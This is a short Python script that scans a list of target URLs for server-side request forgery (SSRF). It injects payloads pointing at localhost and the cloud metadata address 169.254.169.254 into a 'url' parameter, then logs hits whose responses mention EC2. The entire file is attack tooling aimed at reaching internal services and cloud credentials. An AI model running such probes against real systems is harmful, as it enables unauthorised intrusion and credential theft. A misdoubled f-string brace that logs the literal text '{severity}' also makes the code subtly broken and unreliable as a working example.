import sys, os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import requests
from core.log_to_text import log_to_text, classify_severity
SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://169.254.169.254"
]

def load_targets(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def run_ssrf_scan():
    targets = load_targets("targets/targets.txt")
    for base_url in targets:
        for payload in SSRF_PAYLOADS:
            test_url = f"{base_url}?url={payload}"
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200 and "EC2" in r.text:
                    log = f"[+] SSRF detektovan: {test_url}"
                    print(log)
                    severity = classify_severity(log)
                    log_to_text(__file__, log + f' | Severity: {{severity}}')
            except:
                continue

if __name__ == "__main__":
    run_ssrf_scan()
